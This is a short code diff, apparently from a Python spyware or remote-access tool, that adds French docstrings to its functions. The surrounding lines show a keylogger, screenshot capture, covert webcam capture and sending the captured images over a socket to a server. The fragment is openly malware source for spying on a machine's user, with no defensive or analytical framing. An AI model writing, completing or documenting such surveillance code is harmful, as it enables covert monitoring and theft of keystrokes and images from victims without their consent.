@@ -46,6 +46,9 @@ def start_keylogger():
         listener.join()
 
 def capture_screenshot():
+    """
+    Capture l'écran de la machine
+    """
     screenshot = pyautogui.screenshot()
     buffer = io.BytesIO()
     screenshot.save(buffer, format="PNG")
@@ -53,6 +56,9 @@ def capture_screenshot():
     return buffer.getvalue()
 
 def capture_webcam_image():
+    """
+    Capture d'image via la webcam de la machine
+    """
     cap = cv2.VideoCapture(0)
 
     if not cap.isOpened():
@@ -70,6 +76,9 @@ def capture_webcam_image():
         return None
 
 def send_image_to_server(cs, image_bytes):
+    """
+    Envoi de l'image capturée au serveur
+    """
     cs.send(str(len(image_bytes)).encode())
     cs.recv(1024)
 
